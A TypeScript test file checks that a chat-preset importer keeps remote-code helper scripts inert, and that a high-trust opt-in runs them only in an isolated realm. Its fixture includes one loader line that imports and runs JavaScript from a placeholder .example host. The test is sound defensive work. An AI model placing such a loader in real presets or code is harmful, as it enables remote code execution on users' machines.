// test/presetHighTrust.test.ts
//
// Issue 19 item 5 (end-to-end): a preset's remote-code script is dropped INERT at import (ADR 0017); the
// per-preset high-trust opt-in installs it to RUN, but pinned to the isolated WCV realm — the inline
// transport (app renderer) never resolves it. Proves the isolated-realm boundary through the real
// import + opt-in services.
import { describe, it, expect, afterAll } from 'vitest'
import fs from 'fs'
import os from 'os'
import path from 'path'
import { randomUUID } from 'crypto'
import { importPresetFromFile, getActivePresetId } from '../src/main/services/presetService'
import { isPresetHighTrust, setPresetHighTrust } from '../src/main/services/presetTrustService'
import { getActiveScripts, listScripts } from '../src/main/services/scriptService'
import { getGrants } from '../src/main/services/pluginService'
import { getAppDir } from '../src/main/services/storageService'

const profileId = `test-${randomUUID()}`
const profileDir = path.join(getAppDir(), 'profiles', profileId)
const tmpFiles: string[] = []
afterAll(() => {
  fs.rmSync(profileDir, { recursive: true, force: true })
  for (const f of tmpFiles) fs.rmSync(f, { force: true })
})

// Synthesized ST preset: one plain TH script + one REMOTE-CODE script (fake domain, SoliUmbra-loader
// shape). Prose is placeholder text — no third-party content.
const preset = (): any => ({
  name: 'HT Preset',
  temperature: 0.7,
  openai_max_tokens: 1024,
  prompts: [{ identifier: 'main', name: 'Main', role: 'system', content: 'Tell {{char}}.' }],
  prompt_order: [{ character_id: 100001, order: [{ identifier: 'main', enabled: true }] }],
  extensions: {
    tavern_helper: {
      scripts: [
        { type: 'script', enabled: true, id: 'th-local', name: 'local', content: "log('x')" },
        {
          type: 'script',
          enabled: true,
          id: 'th-remote',
          name: 'remote loader',
          content: "import('https://jnai2d9kgnbs6xzx5c.example/regex_bind/inject.js')"
        }
      ]
    }
  }
})

const writeTmp = (raw: any): string => {
  const p = path.join(os.tmpdir(), `rpt-ht-${randomUUID()}.json`)
  fs.writeFileSync(p, JSON.stringify(raw), 'utf-8')
  tmpFiles.push(p)
  return p
}

describe('per-preset high-trust opt-in (ADR 0017 / issue 19)', () => {
  it('imports the remote-code script INERT, then the opt-in installs it as high-trust WCV-only', () => {
    const res = importPresetFromFile(profileId, writeTmp(preset()))
    expect(res).not.toBeNull()
    const presetId = getActivePresetId(profileId)!

    // At import: only the LOCAL script installed (remote-code one is inert), and NOT high trust yet.
    const afterImport = listScripts(profileId).filter((s) => s.scope === 'preset')
    expect(afterImport.map((s) => s.name).sort()).toEqual(['local'])
    expect(afterImport[0].id).toBe('th-local') // upstream id preserved (issue 03)
    expect(isPresetHighTrust(profileId, presetId)).toBe(false)

    // Opt in: the remote-code script installs, flagged high-trust.
    const installed = setPresetHighTrust(profileId, presetId, true)
    expect(installed).toBe(1)
    expect(isPresetHighTrust(profileId, presetId)).toBe(true)
    // High trust implies the isolated-realm network grant, but NEVER app-reaching `trusted`.
    const grant = getGrants(profileId, `preset:${presetId}`)
    expect(grant.highTrust).toBe(true)
    expect(grant.remoteScripts).toBe(true)
    expect(grant.trusted).toBeUndefined()

    const ht = listScripts(profileId).find((s) => s.name === 'remote loader')!
    expect(ht.highTrust).toBe(true)
    expect(ht.remoteCode).toBe(true)
    expect(ht.id).toBe('th-remote') // upstream id preserved

    // The boundary: the high-trust script resolves ONLY in the isolated realm.
    const ctx = { presetId }
    expect(getActiveScripts(profileId, ctx).map((s) => s.name)).not.toContain('remote loader')
    expect(
      getActiveScripts(profileId, { ...ctx, isolatedRealm: true }).map((s) => s.name)
    ).toContain('remote loader')

    // Opt out: the high-trust script is removed and the grant cleared.
    const removed = setPresetHighTrust(profileId, presetId, false)
    expect(removed).toBe(1)
    expect(isPresetHighTrust(profileId, presetId)).toBe(false)
    expect(listScripts(profileId).some((s) => s.name === 'remote loader')).toBe(false)
    expect(listScripts(profileId).some((s) => s.name === 'local')).toBe(true) // normal script untouched
  })
})
